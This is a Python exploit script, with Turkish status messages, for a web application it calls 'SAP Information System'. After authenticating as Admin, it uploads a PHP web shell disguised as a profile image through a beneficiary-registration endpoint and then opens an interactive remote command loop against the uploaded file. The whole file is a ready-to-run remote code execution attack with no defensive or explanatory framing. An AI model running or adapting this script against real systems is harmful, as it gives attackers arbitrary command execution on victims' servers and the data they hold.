import requests
import sys
import os
import urllib
import re
from colorama import Fore
import datetime
import argparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        pass

    def info (self, message):
        print(Fore.BLUE+'[i]'+Fore.RESET+message)

    def warning (self, message):
        print(Fore.MAGENTA+'[!]'+Fore.RESET+message)

    def error (self, message):
        print(Fore.RED+'[-]'+Fore.RESET+message)

    def success (self, message):
        print(Fore.YELLOW+'[+]'+Fore.RESET+message)

output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'} #proxy

def authentication(username,password):
	global s
	global cookies
	s = requests.Session()
	data = {
        "username" : username, #username
        "password" : password, #password
        "role" : "Admin" #role
	}
	try:
		response = s.post(target_ip+"/controllers/login-user.php",data=data,verify=False, proxies=proxies)
		output.success("Başarıyla giriş yapıltı")
		cookies = response.cookies.get_dict()
	except requests.HTTPError as exception:
		output.error("HTTP hatası : {}".format(exception))
		sys.exit(1)

def webshell(target_ip,session):
    try:
        WEB_SHELL = target_ip+'/uploads/sh3llll.php'
        getdir = {'cmd': 'echo CMD'}
        r2 = requests.get(WEB_SHELL, params=getdir, cookies=cookies,verify=False)
        status = r2.status_code
        if status != 200:
            output.error("Web Shell'e bağlanamadım")
            r2.raise_for_status()
        output.success("Web Shell'e başarıyla bağlanıldı.")
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = "\033[91m"+cwd[0]+"\033[0m> "
        term = cwd
        while True:
            thought = input(term)
            command = {'cmd': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\n"); pass
        sys.exit(-1)

def create_phpshell():
    data_input = { 'lastname':'aaa', 'firstname':'aaa', 'middlename':'aaa', 'age':'30', 'birthdate':'1990-01-01',
        'gender':'Male','household_number':'aaa','birthplace':'aaa','differently_abledperson':'aaa',
        'gcash_number':'123','blood_type':'ab','purok_no':'2','civil_status':'Single','total_householdmember':'aaa',
        'religion':'aaa','occupation':'aaa','contact_number':'12345','username':'hahahaha', 'password':'hahahaha'}
    phpshell = { 'image_profile': ( 'sh3llll.php', '<?php echo shell_exec($_REQUEST["cmd"]); ?>', 'application/octet-stream',{'Content-Disposition': 'form-data'})}
    return data_input,phpshell

def upload_shell(target_ip):
    data_input,phpshell = create_phpshell()
    output.info("RCE için PHP Shell'i yükleme...")
    upload = s.post(target_ip+'/controllers/add_beneficiaries2.php', cookies=cookies, files=phpshell, data=data_input)
    shell_upload = True if("1" in upload.text) else False
    if shell_upload:
        output.success("PHP Shell başarıyla yüklendi!")
    else:
        output.error("PHP Shell'i yükleyemedim!")

def get_args():
    parser = argparse.ArgumentParser(description='SAP Information System | Remote Code Execution (Authenticated)')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target')
    parser.add_argument('-u', '--username', dest="username", required=True, action='store', help='Username target')
    parser.add_argument('-p', '--password', dest="password", required=True, action='store', help='Password target')
    args = parser.parse_args()
    return args

try:
    args = get_args()
    target_ip = args.url
    username = args.username
    password = args.password
    
    authentication(username,password)#authentication
    upload_shell(target_ip)#Uploading Reverse Shell
    webshell(target_ip, s)#Executing The Webshell
except KeyboardInterrupt:
    pass

